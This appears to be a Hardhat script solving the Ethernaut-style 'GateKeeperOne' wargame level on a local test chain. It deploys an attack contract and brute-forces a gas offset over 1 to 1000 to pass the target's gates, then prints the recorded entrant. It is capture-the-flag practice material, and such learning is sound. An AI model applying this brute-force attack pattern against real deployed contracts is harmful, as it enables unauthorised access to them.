


import { ethers } from "hardhat";
import { HackedEvent } from "../typechain-types/GateKeeperOne.sol/GateKeeperOneAttack";

const CONTRACT_ADDRESS = "0xd1c0400E4D1cb3E9B5b8b7571814729E72BF7061"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("GateKeeperOne", CONTRACT_ADDRESS, signer)


  const GateKeeperOneAttackContract = await ethers.getContractFactory("GateKeeperOneAttack")
  const gateKeeperOneAttackContract = await GateKeeperOneAttackContract.deploy()
  await gateKeeperOneAttackContract.deployed()

  const attackContract = await ethers.getContractAt("GateKeeperOneAttack", gateKeeperOneAttackContract.address, signer)

  const [lowerGasBrute, upperGasBrute] = [1, 1000];
  const hackTxn = await attackContract.attack(
    contract.address,
    lowerGasBrute,
    upperGasBrute,
    {
      gasLimit: ethers.BigNumber.from(`30000000`),
    }
  );

  // const { events } = await hackTxn.wait();
  // const { args: { gasBrute } } = events?.find(({ event }) => (event === "Hacked")) as HackedEvent;
  // console.log(`[>] GAS BRUTE: ${gasBrute}`);
  console.log(await contract.entrant());
  // await contract.enter(contract.address)



}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});